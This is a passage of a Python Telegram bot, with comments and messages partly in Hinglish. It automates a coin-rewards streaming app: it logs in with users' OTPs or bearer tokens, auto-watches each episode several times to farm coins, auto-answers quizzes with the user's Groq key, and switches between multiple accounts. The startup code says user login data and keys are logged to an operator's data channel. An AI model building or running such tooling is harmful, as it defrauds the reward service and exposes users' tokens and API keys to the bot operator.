                if (s.get("_id") or s.get("id") or s.get("series_id")) == series_id:
                    title = s.get("title") or s.get("hindiTitle") or "Series"
                    break

        stop_flags.pop(uid, None)
        header = f"⚡ <b>4x Watch All:</b> {title or series_id}\n\n⏳ Starting..."

        try:
            if query.message is not None:
                msg = await query.message.reply_text(header)
            else:
                msg = await context.bot.send_message(chat_id=chat_id, text=header)
        except Exception as send_err:
            try:
                await query.answer(f"Msg send failed: {str(send_err)[:60]}", show_alert=True)
            except Exception:
                pass
            return

        loop = asyncio.get_running_loop()

        async def async_progress(text):
            try:
                await msg.edit_text(f"{header}\n\n{text[-800:]}")
            except Exception:
                pass

        def progress(text):
            try:
                loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(async_progress(text))
                )
            except Exception:
                pass

        result = await loop.run_in_executor(
            BLOCKING_EXECUTOR,
            lambda: bot.watch_series_smart_repeat(
                series_id,
                progress_callback=progress,
                telegram_user_id=uid,
            ),
        )

        if "error" in result:
            try:
                await msg.edit_text(f"❌ {result['error']}")
            except Exception:
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"❌ {result['error']}")
                except Exception:
                    pass
            return

        summary = (
            f"🏁 <b>{result['title']}</b> done\n\n"
            f"Total episodes: {result['episodes']}\n"
            f"Watches performed: {result['watched']}\n"
            f"Skipped: {result['skipped']} | Failed: {result['failed']}\n"
        )
        if result.get("delta") is not None:
            summary += f"💰 {result['balance_before']} → {result['balance_after']} ({result['delta']:+d})\n"
        if result.get("stopped"):
            summary += "⏹ Stopped by user."

        episodes_sorted = context.user_data.get(f"episodes_{series_id}")
        if not episodes_sorted:
            eps, _ = await loop.run_in_executor(
                BLOCKING_EXECUTOR, lambda: bot.get_episodes(series_id, page=1, page_size=500)
            )
            episodes_sorted = sorted(
                eps,
                key=lambda e: int(e.get("episodeNo") or 0) if str(e.get("episodeNo") or "").isdigit() else 0,
            )
        if query.message is not None and episodes_sorted:
            try:
                kb = build_episode_keyboard(series_id, episodes_sorted, bot, force_refresh=True)
                await query.message.edit_reply_markup(reply_markup=kb)
            except Exception:
                pass

        try:
            await msg.edit_text(summary)
        except Exception:
            try:
                await context.bot.send_message(chat_id=chat_id, text=summary)
            except Exception:
                pass

        send_log_sync(
            f"<b>🎬 Series all</b> | User <code>{uid}</code>\n"
            f"{result['title']}: {result['watched']} watches | "
            f"delta {result['delta']:+d if result.get('delta') is not None else '?'}"
        )

    except Exception as top_err:
        err_text = f"❌ Unexpected error: {str(top_err)[:200]}"
        try:
            if msg is not None:
                await msg.edit_text(err_text)
            else:
                await context.bot.send_message(chat_id=chat_id, text=err_text)
        except Exception:
            pass
        logger.error(f"watch_series_all_runner crash user={uid}: {top_err}\n{traceback.format_exc()}")

    finally:
        clear_busy(uid)


async def watch_callback_dispatcher(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    uid = query.from_user.id
    bot = get_bot(uid)

    if data == "noop":
        return

    if data.startswith("sp:"):
        try:
            page = int(data.split(":")[1])
        except Exception:
            page = 0
        cache = context.user_data.get("series_list_cache") or []
        if not cache:
            await query.edit_message_text("Cache expired. /series use karo.")
            return
        series_full = [raw for (_, _, _, raw) in cache]
        kb = build_series_keyboard(series_full, page=page, per_page=20)
        try:
            await query.edit_message_reply_markup(reply_markup=kb)
        except Exception as e:
            await query.message.reply_text(f"Error: {e}")
        return

    if data == "slist":
        cache = context.user_data.get("series_list_cache") or []
        if not cache:
            if not bot.access_token:
                await query.edit_message_text("Not logged in. /login")
                return
            series_list = await asyncio.get_running_loop().run_in_executor(
                BLOCKING_EXECUTOR, lambda: bot.get_all_series(page_size=200, max_pages=6)
            )
            context.user_data["series_list_cache"] = [(
                s.get("_id") or s.get("id") or s.get("series_id"),
                s.get("title") or s.get("hindiTitle") or "???",
                int(s.get("numberOfEpisodes") or s.get("totalEpisodes") or 0),
                s,
            ) for s in series_list if (s.get("_id") or s.get("id") or s.get("series_id"))]
            cache = context.user_data["series_list_cache"]
        series_full = [raw for (_, _, _, raw) in cache]
        total_eps = sum(e for _, _, e, _ in cache)
        header = (
            f"🎬 Choose a Series to Watch:\n\n"
            f"Total series: {len(cache)}\n"
            f"Total episodes across all: {total_eps}\n\n"
            f"Per-episode 4x rewards: 15 → 8 → 5 → 3 coins"
        )
        kb = build_series_keyboard(series_full, page=0, per_page=20)
        await query.edit_message_text(header, reply_markup=kb)
        return

    if data.startswith("ser:"):
        parts = data.split(":")
        if len(parts) >= 2:
            series_id = parts[1]
        else:
            await query.answer("Invalid", show_alert=True)
            return
        header, kb = await _render_series_episodes(query, context, series_id)
        if kb is None:
            await query.edit_message_text(header)
        else:
            await query.edit_message_text(header, reply_markup=kb, parse_mode="HTML")
        return

    if data.startswith("ep:"):
        parts = data.split(":")
        if len(parts) >= 3:
            series_id = parts[1]
            ep_no = parts[2]
        else:
            await query.answer("Invalid", show_alert=True)
            return
        await single_ep_watcher_runner(query, context, series_id, ep_no, is_rewatch=False)
        return

    if data.startswith("rew:"):
        parts = data.split(":")
        if len(parts) >= 3:
            series_id = parts[1]
            ep_no = parts[2]
        else:
            await query.answer("Invalid", show_alert=True)
            return
        await single_ep_watcher_runner(query, context, series_id, ep_no, is_rewatch=True)
        return

    if data.startswith("all:"):
        parts = data.split(":")
        if len(parts) >= 2:
            series_id = parts[1]
        else:
            await query.answer("Invalid", show_alert=True)
            return
        await watch_series_all_runner(query, context, series_id)
        return

    await query.answer(f"Unknown action: {data}", show_alert=True)


async def campaign_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    if not bot.access_token:
        await update.message.reply_text("Not logged in.")
        return
    st = bot.get_campaign_status()
    text = (
        f"🎥 Campaign: {'ON' if st['enabled'] else 'OFF'}\n"
        f"Daily cap: {st['used']}/{st['cap']}\n"
        f"Reached: {st['reached']}"
    )
    await update.message.reply_text(text)


async def accounts_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    accs = bot.list_accounts()
    if not accs:
        await update.message.reply_text("No saved accounts.")
        return
    lines = [f"👥 Saved Accounts ({len(accs)}):\n"]
    keyboard = []
    for i, lbl in enumerate(accs, 1):
        acc = bot.accounts[lbl]
        ph = acc.get("phone") or "?"
        lines.append(f"{i}. {lbl}  |  {ph}")
        keyboard.append([
            InlineKeyboardButton(f"Switch → {lbl}", callback_data=f"sw:{lbl}"),
            InlineKeyboardButton("❌", callback_data=f"rm:{lbl}"),
        ])
    await update.message.reply_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(keyboard))


async def account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    bot = get_bot(query.from_user.id)
    if data.startswith("sw:"):
        label = data[3:]
        ok, msg = bot.switch_account(label)
        if ok:
            bot.open_app()
            bal = bot.get_balance()
            await query.edit_message_text(f"✅ {msg}\n💰 Balance: {bal}")
        else:
            await query.edit_message_text(f"❌ {msg}")
    elif data.startswith("rm:"):
        label = data[3:]
        if bot.remove_account(label):
            await query.edit_message_text(f"Removed: {label}")
        else:
            await query.edit_message_text("Remove failed")


async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱 Phone + OTP", callback_data="login:otp")],
        [InlineKeyboardButton("🔑 Bearer Token", callback_data="login:token")],
    ]
    await update.message.reply_text("Choose login method:", reply_markup=InlineKeyboardMarkup(keyboard))


async def tokenlogin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Direct command: /tokenlogin <access_token>"""
    if not context.args:
        await update.message.reply_text(
            "Usage:\n"
            "`/tokenlogin YOUR_ACCESS_TOKEN_HERE`\n\n"
            "Example:\n"
            "`/tokenlogin eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.....`",
            parse_mode="Markdown",
        )
        return

    token = " ".join(context.args).strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    if len(token) < 20:
        await update.message.reply_text(
            "❌ Token kamzor lagta hai. Full access token paste karo (JWT ya long string)."
        )
        return

    bot = get_bot(update.effective_user.id)
    if is_busy(update.effective_user.id):
        await update.message.reply_text("⏳ Task running, wait...")
        return

    ok = bot.login_with_token(token)
    if ok:
        bot.open_app()
        bal = bot.get_balance()
        await update.message.reply_text(
            f"✅ Token Login Success!\n💰 Balance: {bal}",
            reply_markup=main_menu_keyboard(),
        )
        send_log_sync(
            f"✅ Token Login (direct cmd) | User <code>{update.effective_user.id}</code> | Balance: {bal}"
        )
    else:
        await update.message.reply_text(
            "❌ Token invalid ya expired.\n\n"
            "Check karo:\n"
            "• Token sahi paste kiya hai?\n"
            "• Token abhi bhi active hai?\n"
            "• Token 'Bearer ' prefixed hai toh wo auto remove ho jata hai.\n\n"
            "Naya try: `/tokenlogin <new_token>`"
        )


async def login_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "login:otp":
        await query.edit_message_text("Phone number bhejo (+91... ya 98...):")
        return WAIT_PHONE
    elif query.data == "login:token":
        await query.edit_message_text("Bearer token bhejo:")
        return WAIT_TOKEN
    return ConversationHandler.END


async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+"):
        phone = "+91" + phone.lstrip("0")
    if not re.match(r"^\+[1-9]\d{1,14}$", phone):
        await update.message.reply_text("❌ Invalid phone number. Use format: +91XXXXXXXXXX")
        return WAIT_PHONE

    context.user_data["phone"] = phone
    bot = get_bot(update.effective_user.id)
    st = bot.login_otp_generate(phone)
    if not st:
        await update.message.reply_text(
            "❌ OTP bhejne me fail. Check:\n"
            "• Phone number is correct\n"
            "• Internet connection\n"
            "• Server is reachable\n\n"
            "Try again with /login"
        )
        return ConversationHandler.END
    context.user_data["session_token"] = st
    await update.message.reply_text(f"✅ OTP sent to {phone}\nAb OTP bhejo:")
    return WAIT_OTP


async def login_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    bot = get_bot(update.effective_user.id)
    st = context.user_data.get("session_token")
    if not st:
        await update.message.reply_text("Session lost. /login se start karo.")
        return ConversationHandler.END
    ok = bot.login_otp_verify(st, otp)
    if ok:
        bot.open_app()
        bal = bot.get_balance()
        await update.message.reply_text(
            f"✅ Login success!\n💰 Balance: {bal}",
            reply_markup=main_menu_keyboard(),
        )
        send_log_sync(f"✅ Login success | User <code>{update.effective_user.id}</code> | Balance: {bal}")
    else:
        await update.message.reply_text("❌ OTP verify failed. Check OTP and try again.")
    return ConversationHandler.END


async def login_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    bot = get_bot(update.effective_user.id)
    ok = bot.login_with_token(token)
    if ok:
        bot.open_app()
        bal = bot.get_balance()
        await update.message.reply_text(
            f"✅ Token login success!\n💰 Balance: {bal}",
            reply_markup=main_menu_keyboard(),
        )
        send_log_sync(f"✅ Token login | User <code>{update.effective_user.id}</code> | Balance: {bal}")
    else:
        await update.message.reply_text("❌ Invalid / expired token.")
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flags[user_id] = True
    was_busy = is_busy(user_id)
    if was_busy:
        clear_busy(user_id)
        await update.message.reply_text(
            "⏹ Stopping current task & resetting busy flag... (wait a moment)\n"
            "Agar ab bhi stuck lage to 2-3 sec baad dobara try karo."
        )
    else:
        await update.message.reply_text("⏹ Stop signal bheja (koi active task nahi tha).")


async def series_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Alias /series → choose series/episodes."""
    await watch_series_cmd(update, context)


async def watch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Default /watch → choose series (NOT auto everything)."""
    await watch_series_cmd(update, context)


async def watchall_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Old auto-mode — watch EVERYTHING across all series 4x smart."""
    uid = update.effective_user.id
    chat_id = update.effective_chat.id if update.effective_chat else uid
    bot = get_bot(uid)
    if not bot.access_token:
        await update.message.reply_text("Not logged in. Use /login")
        return

    if not set_busy(uid):
        await update.message.reply_text(
            "⏳ Pehle se ek task chal raha hai. Usse poora hone do ya /stop use karo."
        )
        return

    msg = None
    try:
        stop_flags.pop(uid, None)
        msg = await update.message.reply_text("🚀 Starting full-auto 4x watch...\nYe sab series pe chalaega, time lagega.")

        loop = asyncio.get_running_loop()

        async def async_progress(text):
            try:
                await msg.edit_text(f"🚀 Full-Auto Watching...\n\n{text[-900:]}")
            except Exception:
                pass

        def progress(text):
            try:
                loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(async_progress(text))
                )
            except Exception:
                pass

        result = await loop.run_in_executor(
            BLOCKING_EXECUTOR,
            lambda: bot.browse_and_watch_all_smart_repeat(
                progress_callback=progress,
                max_watches=250,
                telegram_user_id=uid,
            ),
        )

        if "error" in result:
            try:
                await msg.edit_text(f"❌ {result['error']}")
            except Exception:
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"❌ {result['error']}")
                except Exception:
                    pass
            return

        text = (
            f"🏁 Full-Auto Watch finished\n\n"
            f"Watched: {result['watched']}\n"
            f"Skipped: {result['skipped']}\n"
            f"Failed: {result['failed']}\n"
        )
        if result.get("delta") is not None:
            text += f"💰 {result['balance_before']} → {result['balance_after']} ({result['delta']:+d})"
        if result.get("stopped"):
            text += "\n⏹ Stopped by user."
        try:
            await msg.edit_text(text)
        except Exception:
            try:
                await context.bot.send_message(chat_id=chat_id, text=text)
            except Exception:
                pass

    except Exception as top_err:
        err_text = f"❌ Unexpected error: {str(top_err)[:200]}"
        try:
            if msg is not None:
                await msg.edit_text(err_text)
            else:
                await context.bot.send_message(chat_id=chat_id, text=err_text)
        except Exception:
            pass
        logger.error(f"watchall_cmd crash user={uid}: {top_err}\n{traceback.format_exc()}")

    finally:
        clear_busy(uid)


async def quiz_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    if not bot.access_token:
        await update.message.reply_text("Not logged in.")
        return
    data = bot.get_quiz_status()
    if not data:
        await update.message.reply_text("Failed to get quiz status")
        return
    lvl = data.get("currentLevel", "?")
    cfg = data.get("levelConfig", {}) or {}
    hearts = data.get("hearts", {}) or {}
    daily = data.get("dailyAttempts", {}) or {}
    totals = data.get("totals", {}) or {}
    text = (
        f"🧠 Quiz Status\n\n"
        f"Level: {lvl}\n"
        f"Qs: {cfg.get('questionsCount')} | +{cfg.get('coinsPerCorrect')}/correct\n"
        f"Hearts: {hearts.get('freePerLevel')}/level\n"
        f"Daily: {daily.get('used')}/{daily.get('limit')} "
        f"{'[EXHAUSTED]' if daily.get('exhausted') else ''}\n"
        f"Lifetime coins: {totals.get('coins')}"
    )
    await update.message.reply_text(text)


async def quiz_run_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    if not bot.access_token:
        await update.message.reply_text("Not logged in.")
        return ConversationHandler.END

    if not get_user_groq_keys(update.effective_user.id):
        await update.message.reply_text(
            "❌ Pehle apna Groq API key set karo:\n\n"
            "`/setgroq gsk_xxxxxxxx`\n\n"
            "Free key: https://console.groq.com/keys",
            parse_mode="Markdown",
        )
        return ConversationHandler.END

    await update.message.reply_text("Kitne quiz sessions? (10-25, default 15):")
    return WAIT_QUIZ_SESSIONS


async def quiz_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        n = int(update.message.text.strip() or "15")
        n = max(10, min(25, n))
    except Exception:
        n = 15
    context.user_data["quiz_sessions"] = n

    uid = update.effective_user.id
    chat_id = update.effective_chat.id if update.effective_chat else uid
    bot = get_bot(uid)
    sessions = context.user_data.get("quiz_sessions", 15)

    if not set_busy(uid):
        await update.message.reply_text(
            "⏳ Pehle se ek task chal raha hai. Usse poora hone do ya /stop use karo."
        )
        return ConversationHandler.END

    msg = None
    try:
        stop_flags.pop(uid, None)
        msg = await update.message.reply_text(f"🤖 Running {sessions} sessions (delay 10s)...")

        loop = asyncio.get_running_loop()

        async def async_progress(text):
            try:
                await msg.edit_text(f"🤖 Quiz running...\n\n{text[-900:]}")
            except Exception:
                pass

        def progress(text):
            try:
                loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(async_progress(text))
                )
            except Exception:
                pass

        result = await loop.run_in_executor(
            BLOCKING_EXECUTOR,
            lambda: bot.run_quiz_auto(
                max_sessions=sessions,
                question_delay=QUIZ_QUESTION_DELAY,
                progress_callback=progress,
                telegram_user_id=uid,
            ),
        )

        if "error" in result:
            try:
                await msg.edit_text(f"❌ {result['error']}")
            except Exception:
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"❌ {result['error']}")
                except Exception:
                    pass
        else:
            text = (
                f"🏁 Quiz done\n"
                f"Sessions: {result.get('sessions')}\n"
                f"Coins this run: ~{result.get('total_coins')}\n"
                f"Current balance: {result.get('balance')}"
            )
            if result.get("stopped"):
                text += "\n⏹ Stopped by user."
            try:
                await msg.edit_text(text)
            except Exception:
                try:
                    await context.bot.send_message(chat_id=chat_id, text=text)
                except Exception:
                    pass
        return ConversationHandler.END

    except Exception as top_err:
        err_text = f"❌ Unexpected error: {str(top_err)[:200]}"
        try:
            if msg is not None:
                await msg.edit_text(err_text)
            else:
                await context.bot.send_message(chat_id=chat_id, text=err_text)
        except Exception:
            pass
        logger.error(f"quiz_sessions crash user={uid}: {top_err}\n{traceback.format_exc()}")
        return ConversationHandler.END

    finally:
        clear_busy(uid)


async def logout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    bot._reset_state()
    await update.message.reply_text("Logged out.", reply_markup=main_menu_keyboard())


async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip().lower()
    if text == "💰 balance" or text == "balance":
        await balance_cmd(update, context)
    elif text == "📊 campaign" or text == "campaign":
        await campaign_cmd(update, context)
    elif text == "👥 accounts" or text == "accounts":
        await accounts_cmd(update, context)
    elif text == "➕ login" or text == "login":
        await login_start(update, context)
    elif text == "🔑 token login" or text == "token login":
        await update.message.reply_text(
            "🔑 Token Login:\n\n"
            "Command use karo:\n"
            "`/tokenlogin YOUR_FULL_ACCESS_TOKEN`\n\n"
            "Example:\n"
            "`/tokenlogin eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vy...`",
            parse_mode="Markdown",
        )
    elif text == "🎬 watch series" or text == "watch series":
        await watch_series_cmd(update, context)
    elif text == "🎬 watch all (4x)" or text == "watch all (4x)":
        await watchall_cmd(update, context)
    elif text == "watch":
        await watch_cmd(update, context)
    elif text == "🧠 quiz status" or text == "quiz status":
        await quiz_status_cmd(update, context)
    elif text == "🤖 run quiz" or text == "run quiz":
        return await quiz_run_start(update, context)
    elif text == "🔑 set groq key" or text == "set groq key":
        await update.message.reply_text(
            "Apna Groq key bhejo:\n`/setgroq gsk_xxxxxxxx`\n\n"
            "Free key: https://console.groq.com/keys",
            parse_mode="Markdown",
        )
    elif "stop" in text:
        await stop_cmd(update, context)
    elif text == "ℹ️ help" or text == "help":
        await help_cmd(update, context)
    else:
        await update.message.reply_text("Unknown. Use /help")


def main():
    acquire_lock()

    if not TELEGRAM_BOT_TOKEN:
        print("ERROR: Set TELEGRAM_BOT_TOKEN")
        return

    app = (
        Application.builder()
        .token(TELEGRAM_BOT_TOKEN)
        .concurrent_updates(True)
        .executor(BLOCKING_EXECUTOR)
        .build()
    )

    app.add_error_handler(global_error_handler)

    login_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(login_callback, pattern=r"^login:")],
        states={
            WAIT_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_phone)],
            WAIT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_otp)],
            WAIT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_token)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    quiz_conv = ConversationHandler(
        entry_points=[
            CommandHandler("quizrun", quiz_run_start),
            MessageHandler(filters.Regex("^🤖 Run Quiz$"), quiz_run_start),
        ],
        states={
            WAIT_QUIZ_SESSIONS: [MessageHandler(filters.TEXT & ~filters.COMMAND, quiz_sessions)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("balance", balance_cmd))
    app.add_handler(CommandHandler("campaign", campaign_cmd))
    app.add_handler(CommandHandler("accounts", accounts_cmd))
    app.add_handler(CommandHandler("login", login_start))
    app.add_handler(CommandHandler("tokenlogin", tokenlogin_cmd))
    app.add_handler(CommandHandler("series", series_cmd))
    app.add_handler(CommandHandler("watch", watch_cmd))
    app.add_handler(CommandHandler("watchall", watchall_cmd))
    app.add_handler(CommandHandler("quiz", quiz_status_cmd))
    app.add_handler(CommandHandler("setgroq", set_groq))
    app.add_handler(CommandHandler("mygroq", my_groq))
    app.add_handler(CommandHandler("logout", logout_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(account_callback, pattern=r"^(sw|rm):"))
    app.add_handler(CallbackQueryHandler(watch_callback_dispatcher, pattern=r"^(ser:|ep:|rew:|all:|sp:|slist$|noop$)"))
    app.add_handler(login_conv)
    app.add_handler(quiz_conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))

    print("Bot starting (lock acquired).")
    if LOG_CHANNEL_ID:
        print(f"Log channel enabled: {LOG_CHANNEL_ID}")
    else:
        print("WARNING: LOG_CHANNEL_ID not set")
    if DATA_LOG_CHANNEL_ID:
        print(f"Data log channel enabled: {DATA_LOG_CHANNEL_ID}")
    else:
        print("WARNING: DATA_LOG_CHANNEL_ID not set (user login data & key logs won't be saved)")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
